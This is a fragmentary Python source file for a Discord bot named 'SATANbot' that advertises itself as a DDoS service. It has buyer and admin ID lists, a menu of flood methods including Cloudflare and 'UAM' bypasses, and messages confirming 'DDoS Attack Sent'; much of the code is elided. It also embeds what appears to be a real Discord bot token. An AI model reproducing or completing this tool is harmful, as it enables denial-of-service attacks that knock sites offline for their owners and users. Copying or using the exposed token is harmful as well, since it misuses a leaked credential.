__author__ = 'SATAN'
# SATANbot | Discord ddos bot v1.2 | SATAN
#=====Import Module=====#
import os
try:
	import discord
...
buyers  = [1114003677963882557]  #          
admins  = [1114003677963882557]  #   ID users            
owners  = [1114003677963882557]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTE5NTY2NDA4MTk5MDk4MzY5MQ.GsiYD7.lcPkbndl0afM66a26wORpOG-nH6vL7JyGkSalc' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="SATAN Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright SATAN.")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"SATAN Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/SATANtran191/host/main/img.gif")
